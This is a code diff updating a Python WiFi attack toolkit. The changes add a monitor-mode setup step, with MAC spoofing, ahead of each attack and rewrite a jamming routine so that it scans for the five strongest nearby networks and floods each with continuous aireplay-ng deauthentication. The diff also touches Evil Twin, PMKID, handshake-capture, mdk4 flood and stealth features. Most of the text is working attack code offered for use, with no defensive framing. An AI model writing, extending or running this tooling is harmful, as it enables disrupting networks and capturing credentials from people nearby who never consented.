@@ -246,22 +246,38 @@ class WifiToolkit:
 {YELLOW}   \\_/\\_/  |_____|  \\_/\\_/  \\___/|_|\\_\\____/|_____| |_| \\___/|_|\\_\\{NC}
 """
         print(art)
-        title = "WIFI-TOOL By dla v2.9.1 (this tool is free if you buy it, idiots)"
+        title = "WIFI-TOOL By dla v2.9.3 (this tool is free if you buy it, idiots)"
         print(f"{BLUE}{'=' * 70}{NC}")
         print(f"{YELLOW}{title.center(70)}{NC}")
         print(f"{BLUE}{'=' * 70}{NC}\n")
     def check_dependencies(self):
-        """Checks if all required command-line tools are installed."""
+        """Checks if all required and optional command-line tools are installed."""
         self._animated_loading("Checking system dependencies", 1.5)
-        deps = ["airmon-ng", "airodump-ng", "aireplay-ng", "mdk4", "macchanger", "iw"]
-        missing = [dep for dep in deps if not shutil.which(dep)]
+        
+        required_deps = ["airmon-ng", "airodump-ng", "aireplay-ng", "mdk4", "macchanger", "iw"]
+        optional_deps = {"Evil Twin Attack": ["hostapd", "dnsmasq"]}
 
-        if missing:
-            print(f"{RED}Missing required tools: {', '.join(missing)}{NC}")
-            print(f"{YELLOW}Please install them (e.g., sudo apt install aircrack-ng mdk4 macchanger iw){NC}")
+        missing_required = [dep for dep in required_deps if not shutil.which(dep)]
+
+        if missing_required:
+            print(f"{RED}Missing required tools: {', '.join(missing_required)}{NC}")
+            print(f"{YELLOW}Please install them (e.g., sudo apt install aircrack-ng mdk4 macchanger iw hostapd dnsmasq){NC}")
             sys.exit(1)
-        print(f"{GREEN}[✔] All dependencies found.{NC}")
-        self._log("INFO", "All dependencies are satisfied.")
+        
+        all_found = True
+        for feature, deps in optional_deps.items():
+            missing_optional = [dep for dep in deps if not shutil.which(dep)]
+            if missing_optional:
+                all_found = False
+                print(f"{YELLOW}[!] Warning: Missing optional tools for {feature}: {', '.join(missing_optional)}{NC}")
+                print(f"{YELLOW}    The '{feature}' feature will not be available.{NC}")
+
+        if all_found:
+            print(f"{GREEN}[✔] All dependencies found.{NC}")
+        else:
+            print(f"{GREEN}[✔] All required dependencies found. Some features may be limited.{NC}")
+
+        self._log("INFO", "Dependency check complete.")
 
     def select_interface(self):
         """Detects and allows user to select a wireless interface."""
@@ -386,6 +402,8 @@ class WifiToolkit:
 
     def run_airodump_scan(self):
         """Runs a network scan using airodump-ng."""
+        if not self._ensure_monitor_mode():
+            return
         self._print_header()
         print(f"{YELLOW}[?] Select airodump-ng mode:{NC}")
         print("  1) Standard Scan (display only)")
@@ -420,6 +438,8 @@ class WifiToolkit:
 
     def run_dos_attack(self):
         """Execute DoS attack menu using getch() for consistent UI."""
+        if not self._ensure_monitor_mode():
+            return
         while True:
             self._print_header()
             print(f"{YELLOW}=== DoS Attack Menu ==={NC}")
@@ -525,6 +545,8 @@ class WifiToolkit:
 
     def _combined_dos_attack(self, channel, duration, packet_rate=250):
         """Executes a smart, adaptive, and targeted DoS attack."""
+        if not self._ensure_monitor_mode():
+            return
         self._print_header()
         print(f"{YELLOW}[*] Initializing Smart Adaptive Attack...{NC}")
 
@@ -737,175 +759,100 @@ class WifiToolkit:
 
     def _wifi_jamming_attack(self, channel, duration):
         """Executes a WiFi jamming attack on specified channel."""
-        if not self.interface:
-            print(f"{RED}Error: No interface selected{NC}")
-            return
-
         try:
-            iwconfig_output = subprocess.check_output(['iwconfig', self.interface], stderr=subprocess.STDOUT, text=True)
-            if 'Mode:Monitor' not in iwconfig_output:
-                print(f"{RED}[!] Interface {self.interface} is not in monitor mode!")
-                print(f"[!] Please enable monitor mode first{NC}")
-                time.sleep(2)
-                return
-        except subprocess.CalledProcessError:
-            print(f"{RED}[!] Error checking interface mode{NC}")
-            return
-
-        try:
-            print(f"\n{YELLOW}[*] Checking wireless interface...{NC}")
-            try:
-                self._run_command(['ip', 'link', 'set', self.interface, 'up'], quiet=True)
-                time.sleep(1)
-            except:
-                pass
-
-            print(f"\n{YELLOW}[*] Starting network scan (this will take 10 seconds)...{NC}")
-            print(f"{YELLOW}[*] Looking for WiFi networks on channel {'all channels' if channel == 0 else channel}{NC}")
+            print(f"\n{YELLOW}[*] Starting network scan to find jamming targets (10 seconds)...{NC}")
             
-            scan_file = f"/tmp/scan_{int(time.time())}"
+            scan_file = f"/tmp/jam_scan_{os.getpid()}"
             scan_cmd = ['airodump-ng', '--write', scan_file, '--output-format', 'csv', '--band', 'abg']
             if channel > 0:
                 scan_cmd.extend(['--channel', str(channel)])
             scan_cmd.append(self.interface)
             
-            print(f"{YELLOW}[*] Running airodump-ng scan...{NC}")
-            
-            proc = subprocess.Popen(scan_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-            self.active_processes.append(proc)
+            scan_proc = subprocess.Popen(scan_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            self.active_processes.append(scan_proc)
             try:
                 for i in range(10):
                     print(f"\r{YELLOW}[*] Scanning: {'▓' * (i+1)}{'░' * (9-i)} {(i+1)*10}%{NC}", end='', flush=True)
                     time.sleep(1)
             finally:
-                proc.terminate()
-                self.active_processes.remove(proc)
-                try:
-                    proc.wait(timeout=5)
-                except subprocess.TimeoutExpired:
-                    proc.kill()
+                if scan_proc.poll() is None:
+                    scan_proc.terminate()
+                if scan_proc in self.active_processes:
+                    self.active_processes.remove(scan_proc)
             print()
             
             targets = []
-            ap_section = True
             csv_file = f"{scan_file}-01.csv"
-            
-            print(f"\n{YELLOW}[*] Analyzing scan results...{NC}")
-            
             if os.path.exists(csv_file):
                 with open(csv_file, 'r', errors='ignore') as f:
-                    for line in f:
-                        line = line.strip()
-                        if not line:
-                            continue
-                        if 'BSSID' in line:
-                            ap_section = True
-                            continue
-                        if 'Station MAC' in line:
-                            ap_section = False
-                            continue
-                        
-                        if ap_section:
-                            parts = [p.strip() for p in line.split(',')]
-                            if len(parts) >= 14:
-                                bssid = parts[0].strip()
-                                ap_channel = parts[3].strip()
-                                essid = parts[13].strip()
-                                power = parts[8].strip()
-                                
-                                if re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', bssid) and essid:
-                                    if power.replace('-', '').isdigit():
-                                        power = int(power)
-                                        if power > -90:
-                                            targets.append((bssid, ap_channel, essid, power))
-            
+                    reader = csv.reader(f)
+                    in_ap_section = False
+                    for row in reader:
+                        if not row: continue
+                        row = [field.strip() for field in row]
+                        if 'BSSID' in row[0]: in_ap_section = True; continue
+                        if 'Station MAC' in row[0]: break
+                        if in_ap_section and len(row) > 13:
+                            bssid, essid, ch, power = row[0], row[13], row[3], row[8]
+                            if re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', bssid) and essid:
+                                if power.replace('-', '').isdigit() and int(power) > -90:
+                                    targets.append({'bssid': bssid, 'channel': ch, 'essid': essid, 'power': power})
+
             if not targets:
-                print(f"{RED}[!] No networks found! This could mean:{NC}")
-                print(f"{YELLOW}1. No active WiFi networks in range")
-                print("2. Interface not picking up signals")
-                print("3. Wrong channel selected")
-                print(f"4. Interface might need reset{NC}")
-                print(f"\n{YELLOW}Suggestions:{NC}")
-                print("- Try again with channel set to 0 (all channels)")
-                print("- Reset your wireless interface")
-                print("- Make sure you're in range of WiFi networks")
-                time.sleep(4)
+                print(f"{RED}[!] No suitable networks found to jam.{NC}")
+                time.sleep(3)
                 return
                 
-            targets.sort(key=lambda x: x[3], reverse=True)
+            targets.sort(key=lambda x: int(x['power']), reverse=True)
             
-            print(f"\n{GREEN}[✔] Found {len(targets)} networks:{NC}")
+            jam_targets = targets[:5]
+
+            print(f"\n{GREEN}[✔] Found {len(jam_targets)} networks to jam (Top 5):{NC}")
             print(f"\n{'BSSID':<18} {'CH':<4} {'PWR':<6} {'ESSID'}")
             print("="*50)
-            for bssid, channel, essid, power in targets[:5]:
-                print(f"{bssid:<18} {channel:<4} {power:<6} {essid}")
+            for t in jam_targets:
+                print(f"{t['bssid']:<18} {t['channel']:<4} {t['power']:<6} {t['essid']}")
             
-            print(f"\n{GREEN}[*] Starting WiFi jamming attack...")
-            print(f"[*] Channel: {'All' if channel == 0 else channel}")
+            print(f"\n{GREEN}[*] Starting WiFi jamming attack...{NC}")
             if duration > 0:
                 print(f"[*] Duration: {duration} seconds{NC}")
             else:
                 print(f"[*] Duration: Unlimited (Press Ctrl+C to stop){NC}")
 
-            self._log("INFO", f"Starting WiFi jamming on channel {channel}")
-            print(f"\n{YELLOW}[*] Found {len(targets)} networks to attack{NC}")
+            self._log("INFO", f"Starting multi-BSSID deauth attack on {len(jam_targets)} targets.")
             
             jamming_procs = []
             try:
-                for target in targets[:5]:
-                    bssid, ap_channel, essid, power = target
-                    print(f"{GREEN}[*] Attacking {essid} ({bssid}) on channel {ap_channel} (Signal: {power}dBm){NC}")
+                for target in jam_targets:
+                    print(f"{GREEN}[*] Attacking {target['essid']} ({target['bssid']}){NC}")
+                    cmd = ['aireplay-ng', '--deauth', '0', '-a', target['bssid'], self.interface]
                     
-                    try:
-                        self._run_command(['iwconfig', self.interface, 'channel', ap_channel], quiet=True)
-                    except:
-                        print(f"{YELLOW}[!] Failed to set channel {ap_channel} for {essid}, continuing anyway...{NC}")
-                    
-                    if shutil.which('mdk4'):
-                        cmd = ['mdk4', self.interface, 'd', '-b', 'blacklist', '-c', ap_channel, '-s', '100']
-                        with open('blacklist', 'w') as f:
-                            f.write(bssid + '\n')
-                    elif shutil.which('mdk3'):
-                        cmd = ['mdk3', self.interface, 'a', '-a', bssid, '-m', '-s', '100']
-                        if channel > 0:
-                            cmd.extend(['-c', ap_channel])
-                    else:
-                        print(f"{RED}Error: mdk4/mdk3 not found. Please install it first.{NC}")
-                        time.sleep(2)
-                        return
-                    
-                    proc = subprocess.Popen(cmd)
+                    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                     self.active_processes.append(proc)
                     jamming_procs.append(proc)
-                    time.sleep(1)
-
+                
+                print(f"\n{YELLOW}[*] All attack processes launched.{NC}")
                 if duration > 0:
-                    print(f"\n{YELLOW}[*] Running timed attack for {duration} seconds...{NC}")
+                    print(f"{YELLOW}[*] Running timed attack for {duration} seconds...{NC}")
                     time.sleep(duration)
                 else:
-                    print(f"\n{YELLOW}[*] Running continuous attack (Press Ctrl+C to stop)...{NC}")
+                    print(f"{YELLOW}[*] Running continuous attack (Press Ctrl+C to stop)...{NC}")
                     while True:
                         time.sleep(1)
+            except KeyboardInterrupt:
+                print(f"\n{YELLOW}Attack interrupted by user.{NC}")
             finally:
-                print(f"\n{YELLOW}[*] Stopping jamming attack processes...{NC}")
+                print(f"\n{YELLOW}[*] Stopping all jamming processes...{NC}")
                 for proc in jamming_procs:
                     if proc.poll() is None:
                         proc.terminate()
                     if proc in self.active_processes:
                         self.active_processes.remove(proc)
-                print(f"\n{GREEN}[✔] Attack completed.{NC}")
+                print(f"\n{GREEN}[✔] Jamming attack completed.{NC}")
             
             for f in glob.glob(f"{scan_file}*"):
-                try:
-                    os.remove(f)
-                except:
-                    pass
-            
-            if os.path.exists('blacklist'):
-                try:
-                    os.remove('blacklist')
-                except:
-                    pass
+                try: os.remove(f)
+                except: pass
                 
         except Exception as e:
             print(f"{RED}Error during jamming attack: {str(e)}{NC}")
@@ -914,10 +861,6 @@ class WifiToolkit:
 
     def _pmkid_attack(self, channel, duration):
         """Executes PMKID attack."""
-        if not self.interface:
-            print(f"{RED}Error: No interface selected{NC}")
-            return
-
         try:
             output_file = f"/tmp/pmkid_{int(time.time())}.pcapng"
             
@@ -1008,10 +951,6 @@ class WifiToolkit:
             
     def _deauth_attack(self, channel, duration):
         """Executes deauthentication attack."""
-        if not self.interface:
-            print(f"{RED}Error: No interface selected{NC}")
-            return
-
         try:
             print(f"\n{YELLOW}[*] Scanning for networks...{NC}")
             
@@ -1335,6 +1274,8 @@ class WifiToolkit:
 
     def run_mdk4_attack(self):
         """Runs a mass attack using mdk4."""
+        if not self._ensure_monitor_mode():
+            return
         self._print_header()
         print(f"{BLUE}--- MDK4 ATTACK MENU ---{NC}")
         print("1) Deauthentication Flood (Broadcast)")
@@ -1502,6 +1443,8 @@ class WifiToolkit:
 
     def run_interactive_attack(self):
         """Runs a targeted, interactive attack using aireplay-ng."""
+        if not self._ensure_monitor_mode():
+            return
         self._print_header()
         print(f"{YELLOW}[*] Scanning for targets for 20 seconds... Please wait.{NC}")
         
@@ -1717,6 +1660,8 @@ class WifiToolkit:
 
     def run_handshake_capture(self):
         """Automates the process of capturing a WPA/WPA2 handshake."""
+        if not self._ensure_monitor_mode():
+            return
         self._print_header()
         print(f"{YELLOW}[*] Starting automated WPA/WPA2 handshake capture...{NC}")
 
@@ -1906,8 +1851,11 @@ class WifiToolkit:
         """Launches the Evil Twin attack."""
         self._print_header()
         print(f"{YELLOW}[*] Initializing Evil Twin Attack...{NC}")
-        if not self.evil_twin_instance:
-            self.evil_twin_instance = EvilTwin(self.interface, self._log)
+        if not self._ensure_monitor_mode():
+            return
+
+        # Create a new instance every time to ensure it gets the correct interface
+        self.evil_twin_instance = EvilTwin(self.interface, self._log)
         self.evil_twin_instance.start_attack()
         print(f"{GREEN}Press any key to return to the main menu...{NC}")
         getch()
@@ -1919,16 +1867,23 @@ class WifiToolkit:
             
             # --- System Status ---
             print(f"{BLUE}---[ SYSTEM STATUS ]---{NC}")
-            current_mac = self.new_mac or self.original_mac
-            if not current_mac:
-                res = self._run_command(['ip', 'link', 'show', self.interface], quiet=True)
-                match = re.search(r'ether (([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2})', res.stdout if res else "")
-                if match: current_mac = match.group(1)
             
+            if self.interface:
+                res = self._run_command(['iwconfig', self.interface], quiet=True)
+                mode = "Monitor" if res and "Mode:Monitor" in res.stdout.replace(" ", "") else "Managed"
+                current_mac = self.new_mac or self.original_mac
+                if not current_mac:
+                    mac_res = self._run_command(['ip', 'link', 'show', self.interface], quiet=True)
+                    match = re.search(r'ether (([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2})', mac_res.stdout if mac_res else "")
+                    if match: current_mac = match.group(1)
+                
+                print(f"  Interface  : {GREEN}{self.interface}{NC} ({mode} Mode)")
+                print(f"  MAC Address: {YELLOW}{current_mac or 'Unknown'}{NC}")
+            else:
+                print(f"  Interface  : {RED}Not Selected{NC}")
+                print(f"  MAC Address: {RED}N/A{NC}")
+
             stealth_status = f"{GREEN}ACTIVE{NC}" if self.stealth_mode else f"{RED}INACTIVE{NC}"
-            
-            print(f"  Interface  : {GREEN}{self.interface or 'N/A'}{NC} (Monitor Mode)")
-            print(f"  MAC Address: {YELLOW}{current_mac or 'Unknown'}{NC}")
             print(f"  Stealth    : {stealth_status}")
             print(f"  TX Power   : {YELLOW}{self.current_tx_power} dBm{NC}")
             print(f"{BLUE}-----------------------{NC}")
@@ -2219,6 +2174,9 @@ class WifiToolkit:
 
     def toggle_stealth_mode(self):
         """Toggles stealth mode on/off with a consistent getch() UI."""
+        if not self._ensure_monitor_mode():
+            return
+
         if self.stealth_mode:
             self.stealth_mode = False
             if self.stealth_thread and self.stealth_thread.is_alive():
@@ -2412,14 +2370,42 @@ class WifiToolkit:
             except OSError:
                 pass
 
+    def _ensure_monitor_mode(self):
+        """
+        Checks if an interface is in monitor mode, and if not,
+        guides the user through the selection and setup process.
+        Returns True if successful, False otherwise.
+        """
+        if self.interface:
+            res = self._run_command(['iwconfig', self.interface], quiet=True)
+            if res and "Mode:Monitor" in res.stdout.replace(" ", ""):
+                return True
+
+        self._print_header()
+        print(f"{YELLOW}[*] An operation requires an interface in monitor mode.{NC}")
+        
+        self.select_interface()
+        if not self.interface:
+            print(f"{RED}[!] No interface selected. Aborting operation.{NC}")
+            time.sleep(2)
+            return False
+        
+        self.spoof_mac()
+        self.set_monitor_mode()
+
+        res = self._run_command(['iwconfig', self.interface], quiet=True)
+        if res and "Mode:Monitor" in res.stdout.replace(" ", ""):
+            return True
+        else:
+            print(f"{RED}[!] Failed to put interface in monitor mode. Aborting operation.{NC}")
+            time.sleep(2)
+            return False
+
     def run(self):
         """Main execution flow of the script."""
         try:
             self._print_header()
             self.check_dependencies()
-            self.select_interface()
-            self.spoof_mac()
-            self.set_monitor_mode()
             self.show_main_menu()
         except KeyboardInterrupt:
             print(f"\n{RED}Interrupted by user. Exiting...{NC}")
